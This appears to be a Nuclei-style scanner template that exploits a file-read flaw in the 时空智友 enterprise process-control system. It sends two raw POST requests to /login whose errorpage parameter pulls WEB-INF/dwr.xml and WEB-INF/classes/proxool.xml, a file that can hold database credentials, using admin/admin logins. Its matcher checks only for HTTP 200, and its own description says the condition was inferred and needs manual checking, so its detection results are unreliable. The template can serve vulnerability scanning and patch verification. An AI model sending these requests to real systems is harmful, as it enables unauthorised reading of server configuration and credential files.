id: poc-770553f9a5b0d1fbad47
info:
  name: 时空智友企业流程化管控系统login文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 100

    Cache-Control: max-age=0

    Upgrade-Insecure-Requests: 1

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close


    op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Upgrade-Insecure-Requests: 1

    Accept-Encoding: gzi

    Content-Length: 111


    op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&username=admin&password=admin'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
